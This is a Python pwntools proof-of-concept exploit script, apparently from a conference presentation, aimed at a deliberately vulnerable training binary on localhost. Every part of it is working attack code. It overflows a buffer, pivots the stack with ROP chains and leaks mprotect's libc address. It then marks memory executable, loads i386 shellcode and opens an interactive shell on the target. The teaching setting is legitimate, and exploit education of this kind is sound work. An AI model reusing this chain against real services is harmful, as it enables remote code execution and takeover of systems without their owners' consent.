#!/usr/bin/env python
###############################################################
#
# Script: 12_pwn_network_rop_me.py
#
# Date: 02/16/2018
#
# Author: Travis Phillips
#
# Website: https://github.com/jaxhax-travis/presentation-pwntools
#
# Purpose: A PoC Exploit using ROP to invoke mprotect in 
#          network_rop_me. This is intended to be used with
#          the supplied network_rop_me ELF that is generated
#          from network_rop_me.c
#
###############################################################
from pwn import *

HOST = "127.0.0.1"
PORT = 31337
OFFSET = 1040
#context.log_level = "debug"

############################################
def leak(addr):
	r = ROP(e)
	r.write(4, addr, 1)
	r.read(4, TRAMPOLINE_ADDR, len(trampoline))
	r.migrate(TRAMPOLINE_ADDR)
	conn.send(r.chain())
	b = conn.recv(1)
	conn.send(trampoline)
	return b

############################################
# Connect to server.
############################################
conn = remote(HOST, PORT)

############################################
# Give user a chance to attach debugger.
############################################
log.info(conn.recv()[:-1])
#ui.pause()

############################################
# Open elf reference.
############################################
e = ELF('./network_rop_me', checksec=False)
TRAMPOLINE_ADDR = e.bss(0x40)
ROLLINGROP_ADDR = e.bss(0x70)
# make it easy on mprotect() since the the address must be page aligned.
PAYLOAD_ADDR = (e.bss() & 0xFFFFF000) 

############################################
# Build a trampoline stub
############################################
log.info("Building trampoline stub")
trampoline = ROP(e)
trampoline.read(4, ROLLINGROP_ADDR, 4096)
trampoline.migrate(ROLLINGROP_ADDR)
trampoline = trampoline.chain()

############################################
# Build the launchpad stub
############################################
log.info("Building launchpad stub")
rstub = ROP(e)
rstub.read(4, TRAMPOLINE_ADDR, 0x30)
rstub.migrate(TRAMPOLINE_ADDR)
if context.log_level == "debug":
	print(rstub.dump())

############################################
# Build exploit with the launchpad stub
############################################
log.info("Building payload")
data = "A"*OFFSET
data += rstub.chain()
log.info("Sending exploit.")
conn.sendline(data)

############################################
# Send our trampoline code
############################################
log.info("Sending trampoline stub")
conn.send(trampoline)

############################################
# Use the trampoline and leak() function to
# harvest the address of mprotect.
############################################
d = DynELF(leak, elf=e)
log.info("Leaking mprotect address from remote process")
p = log.progress("Leaking...")
if context.log_level != "debug":
	context.log_level = "error"
mprotect = d.lookup("mprotect", 'libc')
if context.log_level != "debug":
	context.log_level = "info"
p.success("mprotect is @ " + hex(mprotect))

############################################
# Build the final rop chain, call mprotect
# and mark binary memory space as rwx, then
# use read to read in the actual payload,
# and finally, call our payload.
############################################
log.info("Building mprotect 777 Download and execute ROP.")
r = ROP(e)
r.call(mprotect, (PAYLOAD_ADDR, 0x1000, 7))
r.read(4, PAYLOAD_ADDR, 4096)
r.call(PAYLOAD_ADDR)
log.debug("bss => 0x{:08x}".format((e.bss())))
log.info("Sending Chain!")
#print(r.dump())
conn.send(r.chain())

############################################
# Send the payload to the server. The
# payload is done with asm() and shellcraft.
# our payload will echo() a "GET RECK'D SON!"
# message to the server console, and give us
# an interactive shell using findpeersh()
############################################
log.info("Sending custom payload")
payload = asm(shellcraft.i386.linux.echo("\n\n\t\t\033[32;1m(>^_^)> GET REKT'D SON! <(^_^<)\033[0m\n\n") + shellcraft.i386.linux.findpeersh())
conn.send(payload)
conn.interactive()

conn.close()
